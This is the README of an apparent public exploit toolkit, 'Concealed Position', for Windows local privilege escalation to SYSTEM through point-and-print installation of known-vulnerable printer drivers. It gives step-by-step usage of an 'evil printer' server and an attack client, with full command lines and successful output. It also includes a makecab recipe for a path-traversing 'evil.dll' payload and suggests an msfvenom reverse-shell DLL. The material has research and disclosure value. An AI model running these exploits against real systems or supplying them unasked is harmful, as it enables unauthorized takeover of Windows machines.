# Concealed Position

Concealed Position is a local privilege escalation attack against Windows using the concept of "Bring Your Own Vulnerability". Specifically, Concealed Position (CP) uses the *as designed* package point and print logic in Windows that allows a low privilege user to stage and install printer drivers. CP specifically installs drivers with known vulnerabilities which are then exploited to escalate to SYSTEM. Concealed Position was first presented at DEF CON 29.

## What exploits are available
Concealed Position offers four exploits - all with equally dumb names:

* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE

The exploits are neat because, besides SLASHINGDAMAGE, they will continue working even after the issues are patched. The only mechanism Windows has to stop users from using old drivers is to revoke the driver's certificate - something that is not(?) historically done.

## But which exploit should I use?!

Probably ACIDDAMAGE. RADIANTDAMAGE and POISONDAMAGE are race conditions (to overwrite a DLL) and SLASHINGDAMAGE damage, hopefully, is patched most everywhere.

## How does it work?
Concealed Position has two parts. An evil printer and a client. The client reaches out to the server, grabs a driver, gets the driver stored in the driver store, installs the printer, and exploits the install process. Easy! In MSAPI speak, the attack goes something like this:

```
Step 1: Stage the driver in the driver store
client to server: GetPrinterDriver
server to client: Response with driver

Stage 2: Install the driver from the driver store
client: InstallPrinterDriverFromPackage

Stage 3: Add a local printer (exploitation stage)
client: Add printer
```

It is important to note that SLASHINGDAMAGE doesn't actually work like that though. SLASHINGDAMAGE is an implementation of the evil printer attack described at DEFCON 28 (2020) and has long since been patched. I just so happen to enjoy the attack (it sparked the rest of this development) and figured I'd leave the exploit in my evil server... as confusing as that may be.

## Is this a Windows vulnerability?
Arguably, yes. The driver store is a ["trusted collection of ... third-party driver packages"](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/driver-store) that requires administrator access to modify. Using `GetPrinterDriver` a low privileged attacker can stage arbitrary drivers into the store. This, to me, crosses a clear security boundary.

Microsoft seemed to agree when they issued [CVE-2021-34481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481).

Although... it's arguable that this is simply a feature of the system and not a vulnerability at all. It really doesn't matter all that much. An attacker can escalate to SYSTEM on standard Windows installs.

## Which verions of Windows are affected by CVE-2021-34481?
At least Windows 8.1 and above.

## How do I use these tools?

Simple! So simple there will be many paragraphs to describe it!

### CP Server
First, let's look at cp_server's command line options:

```
C:\Users\albinolobster\concealed_position\build\x64\Release\bin>cp_server.exe
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    server!

CLI options:
  -h, --help                     Display the help message
  -e, --exploit arg              The exploit to use
  -c, --cabs arg (=.\cab_files)  The location of the cabinet files

Exploits available:
        ACIDDAMAGE
        POISONDAMAGE
        RADIANTDAMAGE
        SLASHINGDAMAGE

C:\Users\albinolobster\concealed_position\build\x64\Release\bin>
```

Above you can see the server requires two options:

1. The exploit to configure the printer for
2. A path to this repositories cab_files (.\cab_files\ is the default)

For example, let's say we wanted to configure an evil printer that would serve up the ACIDDAMAGE driver. Just do this:

```
C:\Users\albinolobster\concealed_position\build\x64\Release\bin>cp_server.exe -e ACIDDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    server!

[+] Creating temporary space...
[+] Expanding .\cab_files\ACIDDAMAGE\LMUD1o40.cab
[+] Pushing into the driver store
[+] Cleaning up tmp space
[+] Installing print driver
[+] Driver installed!
[+] Installing shared printer
[+] Shared printer installed!
[+] Automation Done.
[!] IMPORTANT MANUAL STEPS!
[0] In Advanced Sharing Settings, Turn off password protected sharing.
[1] Ready to go!

C:\Users\albinolobster\concealed_position\build\x64\Release\bin>
```

And that's it, you'll see a new printer on your system:

```
PS C:\Users\albinolobster\concealed_position\build\x64\Release\bin> Get-Printer

Name                           ComputerName    Type         DriverName                PortName        Shared   Publishe
                                                                                                               d
----                           ------------    ----         ----------                --------        ------   --------
ACIDDAMAGE                                     Local        Lexmark Universal v2      LPT1:           True     False
CutePDF Writer                                 Local        CutePDF Writer v4.0       CPW4:           False    False
OneNote for Windows 10                         Local        Microsoft Software Pri... Microsoft.Of... False    False
Microsoft XPS Document Writer                  Local        Microsoft XPS Document... PORTPROMPT:     False    False
Microsoft Print to PDF                         Local        Microsoft Print To PDF    PORTPROMPT:     False    False
Fax                                            Local        Microsoft Shared Fax D... SHRFAX:         False    False


PS C:\Users\albinolobster\concealed_position\build\x64\Release\bin>
```

Note that there is one manual step that `cp_server` prompts you to do. Because I'm a junk hacker, I couldn't figure out how to programmatically set the "Advanced Sharing Settings" -> "Turn off password protected sharing". You'll have to do that yourself!

The process for using `SLASHINGDAMAGE` is a little different. You'll need to first install CutePDF Writer (find the installers in the 3rd party directory). Then run cp_server and *then* you'll still need to follow a couple of manual steps and reboot.

### CP Client
The client is similarly easy to use. Let's look at it's command line options:

```
C:\Users\albinolobster\concealed_position\build\x64\Release\bin>cp_client.exe
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!

CLI options:
  -h, --help         Display the help message
  -r, --rhost arg    The remote evil printer address
  -n, --name arg     The remote evil printer name
  -e, --exploit arg  The exploit to use
  -l, --local        No remote printer. Local attack only.
  -d, --dll arg      Path to user provided DLL to execute.

Exploits available:
        ACIDDAMAGE
        POISONDAMAGE
        RADIANTDAMAGE
```

First, I'd like to address the --dll option. The client has an embedded payload that will simply write the C:\result.txt file. However, users can provide their own DLL via this option. A good example of something you might want to use is an x64 reverse shell produced by msfvenom. But for the rest of this we'll just assume the embedded payload.

`cp_client` has two modes: remote and local. The remote option is the most interesting because it adds the vulnerable driver to the driver store (thus executing the bring your own print driver vulnerability), so we'll go with that first. Let's say I want to connect back to the evil ACIDDAMAGE printer we configured previously. I just need to provide:

1. The exploit I want to use
2. The evil printer IP address
3. The name of the evil shared printer

 Like this!
 
 ```
C:\Users\albinolobster\Desktop>cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!

[+] Checking if driver is already installed
[-] Driver is not available.
[+] Call back to evil printer @ \\10.0.0.9\ACIDDAMAGE
[+] Staging driver in driver store
[+] Installing the staged driver
[+] Driver installed!
[+] Starting AcidDamage
[+] Checking if C:\ProgramData\Lexmark Universal v2\ exists
[-] Target directory doesn't exist. Trigger install.
[+] Installing printer
[+] Read in C:\ProgramData\Lexmark Universal v2\Universal Color Laser.gdl
[+] Searching file contents
[+] Updating file contents
[+] Dropping updated gpl
[+] Dropping Dll.dll to disk
[+] Staging dll in c:\tmp
[+] Installing printer
[!] Mucho success!
 ```
 
 That's it!  To execute a local only attack, you just need to provide the exploit:
 
 ```
 C:\Users\albinolobster\concealed_position\build\x64\Release\bin>cp_client.exe -l -e ACIDDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!

[+] Checking if driver is already installed
[+] Driver installed!
[+] Starting AcidDamage
[+] Checking if C:\ProgramData\Lexmark Universal v2\ exists
[-] Target directory doesn't exist. Trigger install.
[+] Installing printer
[+] Read in C:\ProgramData\Lexmark Universal v2\Universal Color Laser.gdl
[+] Searching file contents
[+] Updating file contents
[+] Dropping updated gpl
[+] Dropping Dll.dll to disk
[+] Staging dll in c:\tmp
[+] Installing printer
[!] Mucho success!

C:\Users\albinolobster\concealed_position\build\x64\Release\bin>
 ```

## Why doesn't the client have a SLASHINGDAMAGE option?
`SLASHINGDAMAGE` doesn't need a special client for exploitation. You can just use the UI or the command line to connect to the remote printer and that's it! Unfortunately, if you want to roll a custom payload you'll need to update the CAB in the cab_files directory. But that's easy. Something like this:

```
echo “evil.dll” “../../evil.dll” > files.txt
makecab /f files.txt
move disk1/1.cab exploit.cab
```

It's probably important to know that the version of `SLASHINGDAMAGE` in the repo drops ualapi.dll into SYSTEM32 and, when executed on reboot, it drops the C:\result.txt file. 

## Pull Requests and Bugs
Do you want to submit a pull request or file a bug? Great! I appreciate that, but if you don't provide sufficient details to reproduce a bug or explain why a pull request should be accepted then there is a 100% chance I'll close your issue without comment. I appreciate you, but I'm also pretty busy.

## Other things
One thing to note is that the inject_me dll is actually embedded in the cp_client as a C array. If you update inject_me, you'll need to manually update the C array as well (just use xxd to generate the array).
